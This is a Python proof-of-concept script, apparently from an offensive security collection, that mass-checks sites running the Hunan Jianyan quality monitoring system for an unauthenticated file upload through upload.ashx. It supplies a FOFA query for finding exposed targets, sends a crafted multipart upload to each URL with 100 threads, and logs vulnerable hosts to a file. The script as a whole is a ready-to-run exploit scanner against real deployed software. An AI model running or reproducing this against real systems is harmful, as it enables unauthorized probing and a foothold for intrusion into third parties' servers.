# 湖南建研质量监测系统upload.ashx文件上传漏洞
import argparse,requests,sys,time,re,json
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# body="/Content/Theme/Standard/webSite/login.css"

def banner():
    test ="""

██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗     █████╗ ███████╗██╗  ██╗██╗  ██╗
██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗   ██╔══██╗██╔════╝██║  ██║╚██╗██╔╝
██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║   ███████║███████╗███████║ ╚███╔╝ 
██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║   ██╔══██║╚════██║██╔══██║ ██╔██╗ 
╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝██╗██║  ██║███████║██║  ██║██╔╝ ██╗
 ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                                                                                                                                                                                                                                                         

                                                author:果冻
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="湖南建研质量监测系统upload.ashx文件上传漏洞POC")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    api_payload = "/Applications/Attachment/upload.ashx"
    headers = {
        'Content-Type':'multipart/form-data;boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/83.0.4103.116Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Content-Length':'335',   
    }
    data = '--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR\r\nContent-Disposition: form-data; name="file";filename="123.txt"\r\n\r\n123\r\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR\r\nContent-Disposition: form-data; name="_upload_guid"\r\n\r\n123\r\n--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--'
    try:
        res1 = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        if res1.status_code==200 and '123.txt' in res1.text:
            print(f"[+]{target} 存在文件上传漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问") 

if __name__ == "__main__":
    main()